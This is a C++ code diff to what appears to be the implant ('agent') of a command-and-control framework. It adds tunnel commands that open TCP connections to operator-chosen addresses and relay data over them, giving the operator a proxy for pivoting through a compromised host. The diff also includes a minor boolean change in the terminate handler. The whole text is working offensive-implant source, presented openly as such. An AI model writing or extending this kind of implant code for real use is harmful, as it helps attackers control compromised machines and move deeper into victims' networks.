@@ -77,6 +77,15 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_TERMINATE: 
 			this->CmdTerminate(CommandId, inPacker, outPacker); break;
 		
+		case COMMAND_TUNNEL_START:
+			this->CmdTunnelMsgConnectTCP(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_TUNNEL_WRITE:
+			this->CmdTunnelMsgWrite(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_TUNNEL_CLOSE:
+			this->CmdTunnelMsgClose(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_UPLOAD:
 			this->CmdUpload(CommandId, inPacker, outPacker); break;
 
@@ -746,7 +755,34 @@ void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacke
 {
 	agent->config->exit_method  = inPacker->Unpack32();
 	agent->config->exit_task_id = inPacker->Unpack32();
-	agent->SetActive(false);
+	agent->SetActive(FALSE);
+}
+
+void Commander::CmdTunnelMsgConnectTCP(ULONG commandId, Packer* inPacker, Packer* outPacker) 
+{
+	ULONG channelId = inPacker->Unpack32();
+	ULONG addrSize  = 0;
+	CHAR* addr      = (CHAR*)inPacker->UnpackBytes(&addrSize);
+	WORD  port      = inPacker->Unpack32();
+	ULONG taskId    = inPacker->Unpack32();
+
+	this->agent->proxyfire->ConnectMessageTCP(channelId, addr, port, outPacker);
+}
+
+void Commander::CmdTunnelMsgWrite(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG channelId = inPacker->Unpack32();
+	ULONG dataSize  = 0;
+	CHAR* data      = (CHAR*)inPacker->UnpackBytes(&dataSize);
+	ULONG taskId	= inPacker->Unpack32();
+
+	this->agent->proxyfire->ConnectWrite(channelId, data, dataSize);
+}
+
+void Commander::CmdTunnelMsgClose(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG channelId = inPacker->Unpack32();
+	this->agent->proxyfire->ConnectClose(channelId);
 }
 
 void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
